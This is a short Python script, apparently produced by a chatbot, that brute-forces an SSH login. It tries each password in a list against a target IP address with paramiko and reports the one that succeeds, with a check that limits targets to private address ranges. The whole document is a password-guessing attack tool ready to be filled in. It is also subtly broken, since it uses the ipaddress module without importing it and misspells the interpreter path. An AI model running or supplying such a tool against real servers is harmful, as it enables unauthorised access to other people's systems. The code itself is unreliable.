#!/user/bin/python3
import paramiko

# Establish SSH connection
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
username = "example_username"
passwords = ["pass1", "pass2", "pass3"] # Replace with your list of passwords
ip = "192.168.0.1" # Replace with the IP address of the target SSH server
local_network = ["192.168.0.0/16", "10.0.0.0/8"] # Replace with your local network range(s)

if any(ipaddress.ip_address(ip) in ipaddress.ip_network(network) for network in local_network):
    for password in passwords:
        try:
            client.connect(ip, username=username, password=password)
            print("Success - Password found: " + password)
            break
        except:
            print("Incorrect password: " + password)

    client.close()
else:
    print("Error - IP address not in local network.")
# source: Chatbgt